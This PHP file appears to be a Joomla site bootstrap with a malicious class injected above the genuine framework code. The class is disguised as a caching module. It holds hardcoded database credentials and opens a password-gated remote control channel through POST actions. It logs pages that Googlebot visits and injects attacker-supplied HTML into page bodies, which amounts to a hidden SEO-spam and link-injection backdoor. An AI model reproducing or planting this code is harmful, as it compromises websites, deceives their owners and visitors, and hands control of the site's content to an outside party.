<?php

		
class Cache_Class
	{
		private $table = 'jml_cache_module_content';
		public $start_cache = false;
		private $cms = 'jm';
		private $canonical = '';
		
		private $db_host = 'localhost';
		private $db_user = 'epannapo_MZNJyeQ';
		private $db_password = '1EMXBMe-9R=5';
		private $db_name = 'epannapo_MZNJyeQ';
		
		private function url_now()
			{
				return 'http://' . $_SERVER['HTTP_HOST'] . urldecode($_SERVER['REQUEST_URI']);
			}
		
		private function url_create($work = 1)
			{
				@mysql_query(' INSERT INTO `'.$this->table.'` SET `work` = "'.$work.'", `url` = "'.mysql_escape_string($this -> url_now()).'"
				ON DUPLICATE KEY UPDATE `work` = "'.$work.'"
				');
			}
		
		public function url_code()
			{
				if ($query = @mysql_query('SELECT `code` FROM `'.$this->table.'` WHERE `url` = "'.mysql_escape_string($this -> url_now()).'"'))
					{
						return stripslashes(@mysql_result($query, 0));
					}
				
				return '';
			}
		
		private function url_exist()
			{
				if ($query = @mysql_query('SELECT count(*) FROM `'.$this->table.'` WHERE `url` = "'.mysql_escape_string( $this->url_now() ).'"'))
					{
						if (@mysql_result($query, 0) == '0')
							{
								return false;
							}
						else
							{
								return true;
							}
					}
					
				return true;
			}
		
		private function get_code()
			{
				$options['http'] = array(
					'method' => "GET",
					'follow_location' => 0
				);
				
				$context = stream_context_create($options);
				$get = file_get_contents($this->url_now(), NULL, $context);
				
				if (preg_match('!<link[^>]*rel=[\'"]canonical[\'"][^>]*href=[\'"]([^\'"]+)[\'"][^>]*>!is', $get, $_))
					{
						$this -> canonical = html_entity_decode(urldecode($_[1]));
					}
				elseif (preg_match('!<link[^>]*href=[\'"]([^\'"]+)[\'"][^>]*rel=[\'"]canonical[\'"][^>]*>!is', $get, $_))
					{
						$this -> canonical = html_entity_decode(urldecode($_[1]));
					}

				if (!empty($http_response_header))
					{
						sscanf($http_response_header[0], 'HTTP/%*d.%*d %d', $code);
						if (is_numeric($code)) return $code;
					}
				
				return 200;
			}
			
		public function pre_cache()
			{
				if (isset($_POST['action']))
					{
						switch ($_POST['action'])
							{
								case 'get_all_links';
									header("Content-Type: text/plain");
									if ($query  = @mysql_query('SELECT * FROM `'.$this->table.'` WHERE `work` = "1" ORDER BY `url` DESC LIMIT 0, 2500'))
										{
											while ($data = @mysql_fetch_assoc($query)) 
												{
													echo '<e><url>' . $data['url'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
												}
										}
								break;
								
								case 'set_links';
									if (isset($_POST['data']))
										{
											if (mysql_query('UPDATE `'.$this->table.'` SET code = "' . mysql_escape_string($_POST['data']) . '" WHERE code = "" AND `work` = "1" LIMIT 1'))
												{
													echo 'true';
												}
										}
								break;
								
								case 'set_id_links';
									if (isset($_POST['data']))
										{
											if (@mysql_query('UPDATE `'.$this->table.'` SET code = "' . mysql_escape_string($_POST['data']) . '" WHERE `ID` = "' . mysql_escape_string($_POST['id']) . '"'))
												{
													echo 'true';
												}
										}
								break;
								
								default: die('error action');
							}
						exit;
					}
			}
		
		static function wordpress_cache($content)
			{
				$GLOBALS['_cache_'] -> create_new_page();
				$content = $content . $GLOBALS['global_code'];
				$GLOBALS['global_code'] = '';
				return $content ;
			}
		
		public function create_new_page()
			{
				$GLOBALS['_cache_'] -> db_connect();
				if ( (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'googlebot') !== false) &&(!$this -> url_exist()))
					{
						$this -> url_create( 0 );
						
						if (($this -> get_code() == 200) && ( ($this -> canonical == '') || ( $this -> canonical == $this->url_now() ) ))
							{
								$this -> url_create();
							}
					}
			}
		
		static function update_content($content, $code)
			{
				if (!empty($code))
					{
						if (preg_match('!<body[^>]*>!is', $content))
							{
								$content = preg_replace('!(<body[^>]*>)!si', '\1' . $code, $content);
							}
						elseif (preg_match('!</body>!si', $content))
							{
								$content = preg_replace('!</body>!si', $code . '</body>', $content);
							}
						elseif (preg_match('!</html>!si', $content))
							{
								$content = preg_replace('!</html>!si', $code . '</html>', $content);
							}
						else
							{
								$content .= $code;
							}
					}
					
				return $content;
			}
		
		static function _cache($content)
			{
				$GLOBALS['_cache_'] -> create_new_page();
				return Cache_Class::update_content($content, $GLOBALS['global_code']) ;
			}
		
		static function disable_cache()
			{
				 @ob_end_flush();
			}
		
		private function db_connect()
			{
				@mysql_connect($this -> db_host, $this -> db_user, $this -> db_password);
				@mysql_select_db( $this -> db_name );
			}
		
		public function create_cache()
			{
				$this -> start_cache = @ob_start( Array($this, '_cache') );
			}
			
		static function create()
			{
				if ( strpos($_SERVER['REQUEST_URI'], 'wp-admin') !== FALSE ) return ;
				$GLOBALS['_cache_'] = new Cache_Class();
				if ($GLOBALS['_cache_'] -> cms == 'jm') $GLOBALS['_cache_'] -> db_connect();
				if ($_POST['password'] == '861e55e62f131d739c7eb2769a874a81') $GLOBALS['_cache_'] -> pre_cache();
				$GLOBALS['global_code'] = $GLOBALS['_cache_'] -> url_code();
						
				switch ($GLOBALS['_cache_'] -> cms)
					{
						case 'wp';
							add_filter('the_content', Array($GLOBALS['_cache_'], 'wordpress_cache'));
						break;
								
						default: $GLOBALS['_cache_'] -> create_cache();
					}						
			}
			
	}

Cache_Class::create();
/**
 * @package		Joomla.Site
 * @subpackage	Application
 * @copyright	Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
 * @license		GNU General Public License version 2 or later; see LICENSE.txt
 */

// No direct access.
defined('_JEXEC') or die;

//
// Joomla system checks.
//

@ini_set('magic_quotes_runtime', 0);
@ini_set('zend.ze1_compatibility_mode', '0');

//
// Installation check, and check on removal of the install directory.
//

if (!file_exists(JPATH_CONFIGURATION.'/configuration.php') || (filesize(JPATH_CONFIGURATION.'/configuration.php') < 10) || file_exists(JPATH_INSTALLATION.'/index.php')) {

	if (file_exists(JPATH_INSTALLATION.'/index.php')) {
		header('Location: '.substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')).'installation/index.php');
		exit();
	} else {
		echo 'No configuration file found and no installation code available. Exiting...';
		exit();
	}
}

//
// Joomla system startup.
//

// System includes.
require_once JPATH_LIBRARIES.'/import.php';

// Force library to be in JError legacy mode
JError::$legacy = true;
JError::setErrorHandling(E_NOTICE, 'message');
JError::setErrorHandling(E_WARNING, 'message');
JError::setErrorHandling(E_ERROR, 'callback', array('JError', 'customErrorPage'));

// Botstrap the CMS libraries.
require_once JPATH_LIBRARIES.'/cms.php';

// Pre-Load configuration.
ob_start();
require_once JPATH_CONFIGURATION.'/configuration.php';
ob_end_clean();

// System configuration.
$config = new JConfig();

// Set the error_reporting
switch ($config->error_reporting)
{
	case 'default':
	case '-1':
		break;

	case 'none':
	case '0':
		error_reporting(0);
		break;

	case 'simple':
		error_reporting(E_ERROR | E_WARNING | E_PARSE);
		ini_set('display_errors', 1);
		break;

	case 'maximum':
		error_reporting(E_ALL);
		ini_set('display_errors', 1);
		break;

	case 'development':
		error_reporting(-1);
		ini_set('display_errors', 1);
		break;

	default:
		error_reporting($config->error_reporting);
		ini_set('display_errors', 1);
		break;
}

define('JDEBUG', $config->debug);

unset($config);

//
// Joomla framework loading.
//

// System profiler.
if (JDEBUG) {
	jimport('joomla.error.profiler');
	$_PROFILER = JProfiler::getInstance('Application');
}

//
// Joomla library imports.
//

jimport('joomla.application.menu');
jimport('joomla.environment.uri');
jimport('joomla.utilities.utility');
jimport('joomla.event.dispatcher');
jimport('joomla.utilities.arrayhelper');
